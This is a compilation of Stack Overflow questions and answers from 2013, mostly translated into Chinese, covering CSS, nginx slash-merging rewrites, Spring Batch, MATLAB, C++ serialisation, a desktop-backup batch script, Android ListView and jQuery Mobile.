    var sync = require('../lib/sync');
}(requre)); 
```

# css - 约束一个 对兄弟的宽度 的宽度

> ID：14832760
> 
> 赞同：1
> 
> 时间：2013-02-12T12:38:03.697
> 
> 标签：css, css-float, html

我有一些动态生成的图表，每个图表都放在一个容器中，向左浮动：

```
<div class="container">
    <div class="chart"> ... </div>
</div>
<div class="container">
    <div class="chart"> ... </div>
</div>
<div class="container">
    <div class="chart"> ... </div>
</div> 
```

例如，上述产生

![样品 1](../Images/8bfe4c6e86db225f526e5c00fecbf1e6.png)

我想在每个图表下方添加标题，所以我添加了兄弟`<div>`，如下所示：

```
<div class="container">
    <div class="chart"> ... </div>
    <div class="caption"> ... </div>
</div>
<div class="container">
    <div class="chart"> ... </div>
    <div class="caption"> ... </div>
</div>
<div class="container">
    <div class="chart"> ... </div>
    <div class="caption"> ... </div>
</div> 
```

这不起作用，因为未指定父级的宽度会随着标题文本增长：

![样品 2](../Images/442296141cf6742d7aae65fd26759e1d.png)

那么，如何将标题`<div>`宽度限制为图表`<div>`宽度？

该图表由外部 jQuery 库生成，虽然我可以使用 jQuery 获取生成的图表的宽度并将标题`<div>`的宽度设置为该值，但我更喜欢纯 CSS 的解决方案。我还想避免将标题`<div>`注入图表`<div>`（不过，我不确定这有什么帮助）。

我正在寻找的结果看起来更像以下（通过强制换行符伪造的示例）：

![样品 3](../Images/1265bc650e5870f78d88040f645d0533.png)

提前感谢您的任何建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T10:26:55.663

您可以通过应用没有任何位置属性（上、下、左、右）的绝对位置来做到这一点

仅在 Chrome、FF 和 IE10 上测试

```
.container {
    position: relative;
}
.caption {
    position: absolute;
} 
```

[http://jsfiddle.net/YzQcs/](http://jsfiddle.net/YzQcs/)

# jquery - 使用jquery将数据添加到gridview模板字段？

> ID：14832761
> 
> 赞同：0
> 
> 时间：2013-02-12T12:38:05.700
> 
> 标签：jquery, templates, gridview, asp-classic, using

```
<asp:GridView ID="GridView1" runat="server" AutoGenerateColumns="False">
           <Columns>
               <asp:TemplateField HeaderText="isbn">
                   <ItemTemplate>
                       <asp:Label ID="Label1" runat="server" Text="Label"></asp:Label>
                   </ItemTemplate>
               </asp:TemplateField>
               <asp:TemplateField HeaderText="bookname">
                   <ItemTemplate>
                       <asp:Label ID="Label2" runat="server" Text="Label"></asp:Label>
                   </ItemTemplate>
               </asp:TemplateField>
           </Columns>
       </asp:GridView> 
```

如何使用 jquery 将数据添加到 gridview 模板？我知道如何绑定服务器端；我需要知道如何使用 jquery 绑定数据。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-11-17T17:19:27.260

根据类或 Id 以及它在浏览器中的呈现方式，您可以附加数据。

# hyperlink - 指向 PDF 中特定页面的 HTML 链接

> ID：14832767
> 
> 赞同：15
> 
> 时间：2013-02-04T16:38:26.530
> 
> 标签：hyperlink, pdf

我浏览了网络，发现附加`#page=??`到 PDF 链接的末尾会自动将访问者带到 PDF 文件中的特定页面。

我想知道这是否仍然是最佳实践，因为它似乎对我不起作用（Windows 7 上的 Chrome）。另外，到目前为止我找到的所有文章都可以追溯到 2006-2008 年，最近情况有变化吗？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-02-04T18:19:53.987

这仍然是有效的代码，但它可能需要将某些版本的 Acrobat（Reader、Pro 等）作为插件安装在浏览器上，才能按预期工作。由于现在多个常用浏览器都有内置阅读器（Chrome、iOS 版 Safari 是我想到的两大类），因此现在对直接页面链接的支持有些参差不齐。您仍然可以这样做...最坏的情况是 PDF 只会为这些用户打开到第一页，但我建议您不要使用直接页面链接。如果页面很重要，请将其提取到单独的 PDF 并链接到该页面。

# spring-batch - Spring batch writing to different tables conditionally with ItemWriter (ItemProcessor output to Table_A if success or Table_B if fail)

> ID：14832772
> 
> 赞同：1
> 
> 时间：2013-02-12T12:38:50.703
> 
> 标签：spring-batch

I am reading from source table (using JpaPagingItemReader) and passing to ItemProcessor. My requirement is if Item is processed successfully then it should write to TABLE_A and if processing failed then write to TABLE_B. I got it working, but I dont feel it as nice way. My current implementation is

```
// my processor
public class MyItemProcessor implements ItemProcessor<SourceEntity, BaseOutputEntity>{

    @Override
    public BaseOutputEntity process(SourceEntity input) {
       // NOTE: EntityA, EntityB both extend BaseOutputEntity
       try {
           EntityA a = callMyBusiness.method(input);
           return a;
       } catch (MyBusinessException e) {
           EntityB b = createMyFailureObj(input)
           return b;
       }
   }
}

// my itemwriter
public class MyItemWriter extends JpaItemWriter<MyBaseOutputEntity> {
    // donthing as JpaItemWriter methods will take care
} 
```

It is doing functionally what exactly I want. One drawback of above is when I see job execution / step execution history, I can't know how many are successful or how many are failure, as it shows e.g. if 100 reads then 100 writes.

Can anyone suggest better approach. Are conditional steps useful here?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T16:47:53.157

你可以在你的处理器上抛出一个异常，并将这个异常声明为 Skipable（如果不是，chunck 将被破坏）。

如果您实现了[ItemProcessListener](http://static.springsource.org/spring-batch/apidocs/org/springframework/batch/core/ItemProcessListener.html)，您可以在 onProcessError(Entry item, Exception t) 函数上捕获无效项目并将其写入表 B。（仔细阅读文档：一些侦听器函数在事务上，其他则不是）

批处理结束时，writedItemsCount 为有效项数，skippedItemCount 为无效项数。

在不同表中写入的其他方法是将[ClassifierCompositeItemWriter](http://static.springsource.org/spring-batch/apidocs/org/springframework/batch/item/support/ClassifierCompositeItemWriter.html)与 BackToBackPatternClassifier 一起使用，但您会丢失无效项目的数量。

# cordova - PhoneGap Ripple Emulator always reports malformed config.xml

> ID：14832776
> 
> 赞同：19
> 
> 时间：2013-02-12T12:39:00.307
> 
> 标签：cordova, ripple, phonegap-build

Does anyone have any idea, what can cause Ripple Emulator (newesest version) onboard newest version of Chrome to **always** report malformed or missing config file ("*config.xml file could not be found in application's root or is malformed XML*")?

I have my `config.xml` present exactly at application root (i.e. in the same folder, where `index.html` file, used to fire my mobile application). I don't think it's malformed since `PhoneGap Bulid` builds perfectly working applications (though tested only on Android) and does not reports any problems neither with configuration file nor with compilation process.

I'm getting this error not only on my own configuration files, but also on any PhoneGap application, that I've been working with -- including: PhoneGap Hello World example application, alluny's PhoneGap Start Application, Sencha Touch Kitchen Sink demo and others. Actually I haven't found any application in my local resources, that would not cause Ripple Emulator to report problems with `config.xml` file.

Of course, I set proper Chrome's settings, as instructed on Ripple Emulator page and I'm opening my Chrome with proper flag to allow it access local files via *file:///* protocol.

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-05-31T23:43:13.917

我正在使用当前的 Ripple UI (v0.9.15) 并且也遇到了这个问题。

对我来说，这个问题是由于配置文件没有放在正确的位置造成的。在我把它放在正确的位置之后，Ripple 直到我禁用/重新启用 Ripple 才识别它。

对我有用的是：

1.  确保 config.xml 位于带有 index.html 的 www 根目录中（您当前拥有它的位置）
2.  单击左上角的绿色 Ripple 图标并禁用该页面的 Ripple
3.  重新启用波纹

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-03-01T00:02:09.597

刚刚解决了这个问题，这就是我必须做的：

1.  将**config.xml**传输到我的根路径（与 index.html 文件相同的路径）
2.  同时传输**/res**文件夹或编辑所有 .XML 条目以指向正确的路径。
3.  禁用波纹，然后重新启用。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-11-14T14:55:51.250

我花了一段时间才让开关正常工作，但使用 --allow-file-access-from-files 开关打开 Chrome 是解决方案。

# url - Nginx merge_slashes redirect

> ID：14832780
> 
> 赞同：4
> 
> 时间：2013-02-12T12:39:07.507
> 
> 标签：url, redirect, nginx

I am using nginx in with my Java Application and my problem is that nginx is merging the slashes and I am unable to redirect my website to the correct version.

For instance:

```
 http://goout.cz/cs/koncerty///praha/ 
```

is merged to

```
 http://goout.cz/cs/koncerty/praha/ 
```

and then I am unable to recognized the malformed URL and perform the redirection.

I tried to set

```
 merge_slashes off; 
```

and then:

```
 rewrite (.*)//(.*) $1/$2 permanent; 
```

But this has no effect and the // stays in the URL.

How can I achieve this?

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-14T04:29:10.937

试试这个（未经测试）：

```
merge_slashes off;
rewrite (.*)//+(.*) $1/$2 permanent; 
```

如果有多组斜杠，它可能会导致多次重定向。

像这样：

```
http://goout.cz/////cs/koncerty///praha/ 
```

可能会去：

```
http://goout.cz/cs/koncerty///praha/ 
```

然后最后：

```
http://goout.cz/cs/koncerty/praha/ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-02-11T11:13:47.160

这很好用，但对于我的设置添加`port_in_redirect off;`是必要的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-12-18T06:34:57.147

由于错误我们遇到了同样的问题，我们在URL上添加了两个斜杠，nginx会为带有两个斜杠的url返回301错误代码。

我的解决方案是：

添加`merge_slashes off;`到`nginx.conf`文件，并在位置部分，添加`rewrite (.*)//+(.*) $1/$2 break;`

我的位置设置如下：

```
 location / {
        rewrite (.*)//+(.*) $1/$2 break;
        proxy_pass http://http_urltest;
        proxy_http_version 1.1;
        proxy_set_header Connection "";
        proxy_buffers 4096 32k;
        proxy_buffer_size  32K;
        proxy_busy_buffers_size 32k;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    } 
```

添加这两行后，当我使用两个斜杠访问我的 url 时，它将返回一个斜杠的结果。

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2017-04-14T09:58:53.843

试试这个（仅限 nginx 和带有 openresty 配置的 nginx），您可以通过执行这些 301 重定向来改善站点 SEO

请将此代码保留在您的 nginx 站点 conf 文件的服务器部分中

```
server {

........
........

set $test_uri $scheme://$host$request_uri;
if ($test_uri != $scheme://$host$uri$is_args$args) {
    rewrite ^ $scheme://$host$uri$is_args$args? permanent;
}

location {
    ................
    ................
} 
```

}

它对我有用，现在正在使用此代码

例子：-

请求网址- [http://www.test.com//test///category/item//value/](http://www.test.com//test///category/item//value/)

结果网址：- [http://www.test.com/test/category/item/value/](http://www.test.com/test/category/item/value/)

301重定向，使网站的SEO不会下降

# menu - Drupal 7：过滤菜单链接

> ID：14832784
> 
> 赞同：0
> 
> 时间：2013-02-12T12:39:15.183
> 
> 标签：menu, drupal-7, navigation, drupal-themes

我最近创建了一个站点，但遇到了导航栏问题。我的问题是我希望能够过滤掉显示链接。

这是因为我的网站的一部分使用了书籍。作为网站的一部分，用户可以选择 4 个链接，这些链接链接到 4 本书，他们可以按照您的期望浏览这些书。

目前，每个页面的链接显示在页面底部。我想要做的是过滤这些链接，因此它只向用户显示 rel 事件链接，例如，如果它们在 book1 上，它不应该像当前那样显示指向书 2 和 3 及其子页面的链接。

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T15:28:37.287

我认为您已使用 Menu 模块来创建链接。如果您使用 Book 模块（它是核心，您只需启用它）。它将帮助您根据需要创建分层菜单。book 模块创建的菜单看起来像[这个](http://drupal.org/documentation/modules/book)页面上[的菜单（相关的导航菜单](http://drupal.org/documentation/modules/book#book-navigation-627082)）。

* * *

更新：书籍导航在相关书籍页面上创建自己的菜单。它是上下文相关的。从上面的例子可以看出，根据您正在查看的页面，它会显示同级菜单（即与当前页面处于同一级别的页面）。还有下一个和上一个按钮以及上一级链接。

我建议您在主菜单中只创建条目以访问该书。例如，让您拥有三本书，Book1、Book2 和 Book3。

在您的主菜单中创建三个指向这三本书的条目。（删除所有来自书页的条目。）

之后在核心中启用书籍模块并使用书籍模块来管理用于创建书籍页面的内容类型。使用书籍模块菜单系统为书籍页面设计层次结构。

同样，此[链接](http://drupal.org/documentation/modules/book)为您提供了有关使用书籍菜单系统的出色文档。

PS：我描述的方法比使用上下文和视图等其他方法更容易创建与 book 模块开箱即用的相同功能。

# objective-c - 删除 NSTableView 中的选定行

> ID：14832786
> 
> 赞同：2
> 
> 时间：2013-02-12T12:39:27.197
> 
> 标签：objective-c, cocoa, nstableview, nsarraycontroller, nsattributedstring

我是 mac 应用程序的新手。在我的应用程序中，我已经预订了历史 tableview。当用户单击“退出”按钮时，我想删除 tableview 的选定行。我从 NSArraycontroller 获取 tableview 内容。我没有不知道怎么做。如果有人知道，请指导我做。这是在 mac osx 中，而不是在 ios 中。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T16:25:14.673

获得此功能的一种方法是`NSTextView`在表格单元格中使用 a ，然后将属性字符串绑定到您的数组控制器。现在在数组控制器中，您可以通过添加 type 的属性来更改相对值`NSStrikethroughStyleAttributeName`。

# matlab - mvnrnd 函数使用matlab 错误信息？

> ID：14832787
> 
> 赞同：0
> 
> 时间：2013-02-12T12:39:28.527
> 
> 标签：matlab, simulation

我正在创建一个 gibbs 采样算法，当我使用 mvnrnd 函数时出现以下消息：

`??? Error using ==> mvnrnd SIGMA must be a symmetric positive semi-definite matrix.`

注意我在使用 mvnrnd 之前使用过 chol 函数

```
nu02=chol(nu01);
nu0=s*nu02;
z = mvnrnd(mu0,nu0)'; 
```

我能做些什么来解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T16:40:23.907

我猜您的期望`nu0`在您将其传递给 时应该是对称的半正定`mvnrnd`，但由于某种原因，存在非常小的数值问题使其不太对称。

可能还有另一个问题，但如果这是问题所在，您可以使用命令强制它完全对称

```
nu0 = (nu0 + nu0')/2; 
```

希望有帮助。

# matlab - for循环matlab中的多个条件

> ID：14832788
> 
> 赞同：2
> 
> 时间：2013-02-12T12:39:33.013
> 
> 标签：matlab, for-loop, multiple-conditions

我正在尝试编写具有多个条件的 for 循环，例如：

```
for i=1:100 && j=1:100
    plot(i,j)
end 
```

大家能帮帮我吗，这是我第一次这样做

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T13:00:18.087

As ogzd mentioned, this is how you can plot all combinations of `i` and `j` with a nested loop.

If you are specifically interested in plotting though, you probably don't need a double loop for that. Check out:

```
hold on
for i = 1:100
    plot(i,1:100,'o')
end 
```

Or even more vectorized:

```
[a b] = meshgrid(1:100,1:100)
plot(a,b,'o') 
```

EDIT: maybe you are just looking for this:

```
x = 1:100;
plot(x,x) % As y = x , otherwise of course plot(x,y) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T13:19:27.923

要绘制线 y = x：

```
x = 1:100;
y = 1:100;

plot(x, y); 
```

如果这就是你想要做的，你根本不需要循环。

也就是说，要回答您的原始问题，您不能在 for 循环中拥有多个条件，因为您想要一个嵌套的 for 循环，如@DennisJaheruddin 所示。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-12-12T19:48:55.127

% 要绘制 y=x，您可以简单地使用：

```
x=1:100;
y=x;
plot(x,y) 
```

但是，如果要将多个条件放在 for 循环中，请使用：

```
for x=1:100
    for y=1:100
        plot(x,y);
        continue
    end
end 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-12T13:19:12.503

为了[绘制](http://www.mathworks.com/help/matlab/ref/plot.html) 线条`y = x`，您可以简单地做

```
x = 1:100;
plot( x, x, '.-' ); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-12T12:42:08.577

使用**嵌套循环**

尝试这个：

```
hold on
for i=1:100
    for j=1:100
        plot(i,j)
    end
end 
```

# c++ - 存储指向具有模板函数的基础对象的指针

> ID：14832793
> 
> 赞同：0
> 
> 时间：2013-02-12T12:39:38.533
> 
> 标签：c++, templates

基于以下代码，如何在我的“控制器”类中存储指向 Base 的指针？

```
template< class Derived >
class Base
{
public:
  template < typename T >
  void Serialise( T* t )
  {
    Derived* d = static_cast< Derived* >( this );
    d->Serialise( t );
  }
};

class Derived : public Base< Derived >
{
public:
  template < typename T >
  void Serialise( T* t )
  {
    printf( "serialising to object T\n" );
  }
}; 
```

因此，如果我有一个 Controller 类，它将调用 Serialise 函数并传入要序列化的对象，我最终不得不存储具有已知派生类型的指针，因为它是对象类型的一部分，而我需要的是能够使用 Base 类型而不知道它的实际类型是什么：

```
class Controller
{
public:
  void DoSerialise();

private:
  Base< Derived >* m_myObject; // I want this to just be Base* m_myObject but cant due to template!
}; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T12:54:45.830

Short answer - you can't.

Assuming the template argument doesn't affect Base's interface (ie: Derived doesn't appear in any function signatures) you could have a non template Base class, and the derived classes could be templates. This however doesn't fit at all with your current pattern.

In your case if the template argument DOES affect the interface (and I strongly suspect it does in this case) then the Controller would need to know about Derived in order to *use* Base, so where's the harm in it also knowing about Derived in order to *declare* Base.

EDIT after comment: Are you sure that you want any derived class to be able to serialise to *any* type? Why not to have a heirarchy of classes that derive from a `Serialiser` base class, then `Serialise()` can accept a reference to type `Serialiser` and lose the template parameter.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T23:41:20.070

由于基类的类型取决于派生类的类型，因此您似乎想要对问题采取的具体方法是不可能的。这意味着基类模板实例不能表示为单一类型，这对于实现您正在采用的方法是必要的。

然而，这看起来是一个乞求[访问者模式](https://encrypted.google.com/url?sa=t&rct=j&q=visitor%20pattern&source=web&cd=1&cad=rja&sqi=2&ved=0CC4QFjAA&url=http://en.wikipedia.org/wiki/Visitor_pattern&ei=P8IeUcH2K7SG0QGR04GgCg&usg=AFQjCNHUqrzFCxWqFUL-prnFI7nCmHzGZg&bvm=bv.42553238,d.cWE)的问题。访问者模式使双重调度成为可能，而无需强制转换，这正是您想要的。这是一个可能的解决方案：

```
// First declare a base serializable interface that accepts a serializer.

struct ISerializer;    

struct ISerializable {
  virtual void accept_serializer(ISerializer const &) const = 0;
};

// Now declare a base serializer type that can accept any serializable type.

struct Serializable1;
struct Serializable2;
...

struct ISerializer {
  virtual void serialize(Serializable1 const &) = 0;
  virtual void serialize(Serializable2 const &) = 0;
  ...
};

// Then implement your concrete serializable types to accept the serializer and
// invoke it on themselves.

struct Serializable1 : public ISerializable {
  void acceptSerializer(ISerializer const &s) const {
    s.serialize(*this);
  }
};

struct Serializable2 : public ISerializable {
  void acceptSerializer(ISerializer const &s) const {
    s.serialize(*this);
  }
};

// You can actually be a bit more clever to eliminate redundant code:

template<typename DerivedT>
struct SerializableAdapter {
  void acceptSerializer(ISerializer const &s) const {
    s.serialize(*static_cast<DerivedT const *>(this));
  }
};

struct Serializable1 : public SerializableAdapter<Serializable1> {
};

struct Serializable2 : public SerializableAdapter<Serializable2> {
};

// Finally, implement your concrete serializers, including one function for each
// serializable type.

struct Serializer1 : public ISerializer {
  void serialize(Serializable1 const &s) const {
    ...
  }

  void serialize(Serializable2 const &s) const {
    ...
  }
};

struct Serializer2 : public ISerializer {
  void serialize(Serializable1 const &s) const {
    ...
  }

  void serialize(Serializable2 const &s) const {
    ...
  }
};

// Now you can store the serializers through the base interface.

struct Controller {
  void doSerialize(ISerializable &p_serializable) {
    p_serializable.acceptSerializer(*m_serializer)
  }

private:
  ISerializer *m_serializer;
}; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-12T12:56:20.937

你不能那样做。但是 Base::Serialise 所做的唯一事情就是调用派生类的 Serialise 方法。为什么不把它变成纯虚拟的，这样 Base 就不需要模板参数了？

# c# - 带阴影的图片框

> ID：14832794
> 
> 赞同：0
> 
> 时间：2013-02-12T12:39:46.277
> 
> 标签：c#, .net, picturebox

我将如何向 PictureBox 添加阴影？

# c# - ObjectContext.CreateDatabase() 创建不在 .edmx 模型中的其他表

> ID：14832802
> 
> 赞同：3
> 
> 时间：2013-02-12T12:40:00.670
> 
> 标签：c#, database, entity-framework, objectcontext

我有以下代码：

```
HorekoEntities db = new HorekoEntities(Utils.GetDbConnStrByName(db_name));
if (!db.DatabaseExists())
{
    db.CreateDatabase();
} 
```

它使用来自 HorekoEntities 模型的表创建一个数据库。问题是它添加了 3 个不在该模型中的附加表。我在模型中有这些表，但我也从模型和数据库中删除了它们。

在 debagging 中，我看不到那些表，`db`它们不在`db.CreateDatabaseScript()`. （我在某个地方读到了`CreateDatabase()`第一次调用`CreateDatabaseScript()`然后使用该脚本创建数据库的地方）

MSDN 文档将该方法描述为：

“使用当前数据源连接和 StoreItemCollection 中的元数据创建数据库。”

我试图找出里面有什么，`StoreItemCollection`但我不知道如何找到它。也许`StoreItemCollection`是以某种方式缓存这 3 个表？

另一件可能很重要的事情是，这个问题只发生在我们实时服务器的连接字符串上。在我的机器上本地没有。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:58:28.077

You deleted the tables from the context using the designer, right? They're still in your SSDL. Open your EDMX as text (XML editor), search for the table name, and remove any reference to that table.

# batch-file - 从桌面清除所有文件和文件夹并将其移动到桌面中的备份文件夹时出错

> ID：14832804
> 
> 赞同：0
> 
> 时间：2013-02-12T12:40:11.517
> 
> 标签：batch-file, cmd

```
@echo off
set a="%USERPROFILE%\Desktop\Desktop BU\%CurrentDate%"
For /F "tokens=1-5 delims=/-" %%A in ('Date /t') do (SET CurrentDate=%%A%%B%%C)
::echo hi
mkdir "%USERPROFILE%\Desktop\Desktop BU\%CurrentDate%"
::echo dir made
dir %USERPROFILE%\Desktop\ /S /B > %TEMP%\files.txt
::echo done
For /F %%A in (%TEMP%\files.txt) do move %%A "%USERPROFILE%\Desktop\Desktop BU\%CurrentDate%\"
del %TEMP%\files.txt 
```

上面的脚本度过了一段漫长的时光： - 它用适当的日期很好地创建了文件夹 - 在 temp 中创建文件并重定向桌面列表中的输出 - 但之后它给出了错误。找不到指定的路径我尝试了很多东西但它不起作用。您能否让我知道如何将桌面中的文件和文件夹移动到桌面中的文件夹 BACKUP。让我的桌面看起来很干净。而且我还想排除一些被移动的项目。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T15:09:06.483

尝试将您的`for`陈述更改为：

```
For /F "usebackq tokens=*" %%A in ("%TEMP%\files.txt") do move "%%A" "%USERPROFILE%\Desktop\Desktop BU\%CurrentDate%\" 
```

此外，按照目前的方式，您的目标目录最后会有一个空格，并且它会尝试将桌面 BU 移动到自身中。最后，命令中不需要 /s 开关`dir`，因为移动目录将移动其所有子目录。试试这个：

```
@echo off
setlocal
set CurrentDate=%date:~0,2%%date:~3,2%%date:~6,4%
set desktop=%USERPROFILE%\Desktop
dir "%desktop%" /B | find /v "Desktop BU"> "%TEMP%\files.txt"
mkdir "%desktop%\Desktop BU\%CurrentDate%" 2>NUL
For /F "usebackq tokens=*" %%A in ("%TEMP%\files.txt") do move "%desktop%\%%A" "%desktop%\Desktop BU\%CurrentDate%\"
del "%TEMP%\files.txt" 
```

或者这是另一种不需要中间的方式`files.txt`：

```
@echo off
setlocal
set CurrentDate=%date:~0,2%%date:~3,2%%date:~6,4%
set desktop=%USERPROFILE%\Desktop
mkdir "%desktop%\Desktop BU\%CurrentDate%" 2>NUL
for /f "tokens=*" %%A in ('dir "%desktop%" /b ^| find /v "Desktop BU"') do (
    move "%desktop%\%%A" "%desktop%\Desktop BU\%CurrentDate%\"
) 
```

# smalltalk - 在 Pharo 中使用 PetitParser 解析注释

> ID：14832807
> 
> 赞同：11
> 
> 时间：2013-02-12T12:40:18.887
> 
> 标签：smalltalk, pharo, petitparser

有没有比这更简单的方法来解析 1 行注释？

```
comment
    ^ '//' asParser ,
      (#any asParser starLazy: (#newline asParser)) ,
      #newline asParser
                  ==> [ :result | nil "Ignore comments" ]
program
    ^ (comment / instruction) star
        ==> [ :result | N2TProgramNode new
                                setNodes: (result copyWithout: nil) ] 
```

我特别不确定 (#newline asParser) 和 #copyWithout: 的重复。

**在卢卡斯的回答之后，我想出了更简单的以下解决方案：**

```
program
    ^ programEntity star
        ==> [ :result | N2TProgramNode new setNodes: result]

programEntity
    ^ instruction trim: ignorable

ignorable
    ^ comment / #space asParser

comment
    ^ '//' asParser ,  #newline asParser negate star 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-12T17:16:50.683

为什么下面的注释解析器不能正常工作？

```
'//' asParser , #newline asParser negate star 
```

此外，您可能希望将注释解析包含在空格解析中`trim:`（如果语法允许的话），因此您不必一直考虑它。

# android - Android ListView在子布局中重复元素

> ID：14832808
> 
> 赞同：0
> 
> 时间：2013-02-12T12:40:21.363
> 
> 标签：android, listview, layout-inflater, repeat

vybrations 数组列表中的所有图表都是唯一的，但 getView 正在重复列表的元素。我正确使用了 convertView 但它仍在列表中重复相同的图纸。我不知道我在这里做错了什么？

这是我得到的链接：[https ://www.dropbox.com/s/jlt3mr7h5vzb14q/Untitled.jpg](https://www.dropbox.com/s/jlt3mr7h5vzb14q/Untitled.jpg)

```
public class AdapterVybrations extends BaseAdapter
{
private Context context;
public ArrayList<Vybration> vybrations;

public AdapterVybrations(Activity context, ArrayList<Vybration> arrayVybrations)
{
    this.context = context;
    this.vybrations = arrayVybrations;
}

@Override
public View getView(final int position, View convertView, ViewGroup parent)
{
    View v = convertView;
    final Vybration vybe = vybrations.get(position);

    if (v == null)
    {
        LayoutInflater vi = (LayoutInflater) this.context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        v = vi.inflate(R.layout.vybrations_item, null);
    }

    LinearLayout layout = (LinearLayout) v.findViewById(R.id.layoutVybration);
    ImageView play = (ImageView) v.findViewById(R.id.imageViewPlay);

    final ListView lv = (ListView) parent;

    //initialize graph
    XYMultipleSeriesDataset dataset = new XYMultipleSeriesDataset();
    XYMultipleSeriesRenderer renderer = new XYMultipleSeriesRenderer();
    renderer.setDisplayValues(false);
    renderer.setZoomButtonsVisible(false);
    renderer.setShowGrid(false);
    renderer.setShowAxes(false);
    renderer.setShowLabels(false);
    renderer.setShowLegend(false);
    renderer.setPanEnabled(false);
    renderer.setZoomEnabled(false);
    renderer.setAntialiasing(true);
    renderer.setMargins(new int[] { 10, 10, 10, 10 });
    renderer.setPanEnabled(false, false);
    renderer.setYAxisMax(15);
    renderer.setXAxisMax(100);
    XYSeriesRenderer rendererSeries = new XYSeriesRenderer();
    rendererSeries.setColor(Color.GREEN);
    rendererSeries.setFillPoints(true);
    rendererSeries.setLineWidth(2);
    renderer.addSeriesRenderer(rendererSeries);

    //add data series to graph
    dataset.addSeries(vybe.getGraphSeries());
    GraphicalView graphView = ChartFactory.getTimeChartView(context, dataset, renderer, "Test");

    //add graph to linear layout
    layout.addView(graphView);

    layout.setOnTouchListener(new OnTouchListener()
    {

        @Override
        public boolean onTouch(View v, MotionEvent event)
        {
            Log.v("touched", "layout view touched");
            return true;
        }
    });

    play.setOnClickListener(new OnClickListener()
    {
        @Override
        public void onClick(View v)
        {
            vybe.play(false);
            Log.v("series", vybrations.get(position).getGraphSeriesString());
            Log.v("clickposition", position + "");
        }
    });

    if (lv.getChoiceMode() != ListView.CHOICE_MODE_NONE)
    {
        SparseBooleanArray checked = lv.getCheckedItemPositions();
        if (checked.get(position))
            v.setBackgroundColor(context.getResources().getColor(android.R.color.holo_blue_light));
        else
            v.setBackgroundColor(context.getResources().getColor(android.R.color.transparent));
    }

    return v;
}

@Override
public int getCount()
{
    return this.vybrations.size();
}

@Override
public Object getItem(int position)
{
    return this.vybrations.get(position);
}

@Override
public long getItemId(int position)
{
    return position;
}

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-14T13:48:04.677

已解决：[自定义 ListView 项目重复](https://stackoverflow.com/questions/13985240/custom-listview-items-repeated?rq=1)。

我确实尝试了 ViewHolder 设计，但没有删除旧视图。`holder.linearLayout.removeAllViews()`成功了。现在完美运行。

# javascript - 从 JQM 对话框修改页面

> ID：14832815
> 
> 赞同：0
> 
> 时间：2013-02-12T12:40:42.783
> 
> 标签：javascript, jquery, html, css, jquery-mobile

我想要实现的是一个在 div 中有几个按钮的页面。当用户按下其中一个按钮时，会打开一个对话框，询问后续问题。在此之后，用户返回到同一页面，但带有按钮的 div 被隐藏。

我尝试过的是以下内容，在 JQM 页面中，我有一个名为按钮的 div，其中包含按钮（逻辑上）。这将打开对话框并调用一个函数，该函数将按下哪个按钮保存到本地存储中。然后打开对话框，实际上将数据发送到服务器。

由于某种原因，当我从对话框返回时，div 永远不会隐藏。我什至尝试将变量保存到 sessionStorage 并在页面加载时隐藏 div，但似乎从对话框返回时页面加载事件不会触发。有什么建议还是我错过了一些基本的东西？

```
<div class="ui-grid-b" id="buttons">
    <div class="ui-block-a"><a  href="#Popup" data-rel="dialog" onclick="savePushedButton('green')"></a></div>
    <div class="ui-block-b"><a  href="#Popup" data-rel="dialog" onclick="savePushedButton('yellow')"></a></div>
    <div class="ui-block-c"><a  href="#Popup" data-rel="dialog" onclick="savePushedButton('red')"></a></div>
</div><!-- /grid-b -->

// the dialog: 
<div data-role="dialog" id="Popup" data-overlay-theme="b" data-theme="a" class="ui-corner-all">
        <form>
            <div style="padding:10px 20px;">
              <h3>Heading</h3>
              <textarea name="comments" id="popuptextarea"></textarea>
              <button type="submit" data-theme="b" onClick="save()">Selv&auml;</button>
            </div>
        </form>
</div> 
```

我有两个 javascript 函数，它们试图保存数据并隐藏 div，

```
function savePushedButton(color) {
    //save which button was pressed to local storage
    $('#buttons').hide();
    console.log("asd");

}
function save() {
//send data to server
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T13:12:24.413

**onclick**是你的问题（**onchange**也是），不要将它与 jQuery Mobile 一起使用。在触发**onclick**之前，jQuery Mobile 已经开始转换到对话框。您需要手动将单击事件绑定到按钮并隐藏按钮，然后才能转换为对话框。

这是一个工作示例：http: [//jsfiddle.net/Gajotres/uhsfs/](http://jsfiddle.net/Gajotres/uhsfs/)

```
$(document).on('pagebeforeshow', '#index', function(){       
    $(document).on('click', '#test-button', function(){     
        $('#buttons').hide();
        savePushedButton($(this).attr('data-color'));
    });
});

function savePushedButton(color) {
    console.log(color);
